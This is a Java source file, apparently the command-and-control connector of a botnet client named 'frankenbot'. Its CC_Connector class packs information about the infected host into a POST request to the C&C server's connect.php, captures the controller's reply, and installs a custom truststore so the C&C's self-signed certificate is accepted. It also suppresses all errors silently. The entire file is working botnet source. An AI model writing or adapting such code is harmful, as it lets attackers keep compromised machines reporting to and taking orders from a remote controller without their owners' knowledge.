package ca.franky.frankenbot_bot;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Properties;

/**
 * A class that handles the connection to the C&C through POSTs
 * @author fbegin1
 */
public class CC_Connector {
    // The encoded data we are POSTing
    String postData;
    // The reply we got from C&C
    String ccReply;
    // The URL of the C&C
    String ccURL;

    /**
     * A method setup trust so that we trust the self-signed certificate
     * of the C&C
     */
    public void setupTrust() {
        Properties systemProps = System.getProperties();
        systemProps.put("javax.net.ssl.trustStore", "./jssecacerts");
        System.setProperties(systemProps);
    }

    /**
     * An empty constructor
     */
    public CC_Connector() {

    }

    /**
     * Our main constructor
     * @param myPostArray A 2-dimensional array containing the data we want
     *                   to post
     * @param myccURL The url where we are sending this POST
     * @param debug Whether or not we are running in debug mode
     */
    public CC_Connector(String[][] myPostArray, String myccURL,
                        Boolean debug) throws IOException {

        /**
         * We build postData using myPostArray
         */
        postData = "";
        for (int i = 0; i < myPostArray.length; i++){
            try {
                postData += URLEncoder.encode(myPostArray[i][0], "UTF-8") +
                        "=" + URLEncoder.encode(myPostArray[i][1],
                        "UTF-8") + "&";
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        // Cop off trailing '&'
        postData = postData.substring(0, postData.length() - 1);

        ccURL = myccURL;
        ccReply = "noResponse";

        try {
            URL url;

            /**
             * The bot identifies itself and POST information about itself
             */
            url = new URL(ccURL + "connect.php");

            if (debug){
                System.out.println("----- start POST data -----");
                System.out.println(url.toString());
                System.out.println(postData);
                System.out.println("----- end POST data -----");
            }

            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn
                    .getOutputStream());
            wr.write(postData);
            wr.flush();

            /*
             * The bot gets a response from C&C
             */

            String reply = "";
            BufferedReader rd = new BufferedReader(new InputStreamReader
                    (conn.getInputStream()));
            String line;
            while ((line = rd.readLine()) != null) {
                reply += line;
            }
            if (reply != null && ! reply.equals("")) {
                ccReply =  reply;
            }

            wr.close();
            rd.close();

        } catch (Exception e) {
        }
    }
}
